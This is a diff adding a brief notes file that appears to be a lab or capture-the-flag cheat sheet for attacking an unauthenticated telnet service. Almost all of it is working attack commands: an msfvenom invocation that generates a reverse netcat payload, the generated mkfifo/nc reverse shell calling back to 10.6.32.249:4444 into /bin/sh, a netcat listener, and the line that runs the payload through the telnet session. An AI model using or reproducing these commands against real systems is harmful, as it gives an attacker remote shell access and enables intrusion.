@@ -1,0 +1,14 @@
+#msfvenom unauthenticated telnet attack
+
+#On local machine
+msfvenom -p cmd/unix/reverse_netcat lhost=[local IP] lport=4444 R
+
+#Payload
+Payload size: 101 bytes
+mkfifo /tmp/lwwbjgn; nc 10.6.32.249 4444 0</tmp/lwwbjgn | /bin/sh >/tmp/lwwbjgn 2>&1; rm /tmp/lwwbjgn 
+
+#Netcat listen on local machine
+nc -lvp 4444
+
+#Execute payload on telnet connection
+.RUN mkfifo /tmp/lwwbjgn; nc 10.6.32.249 4444 0</tmp/lwwbjgn | /bin/sh >/tmp/lwwbjgn 2>&1; rm /tmp/lwwbjgn 
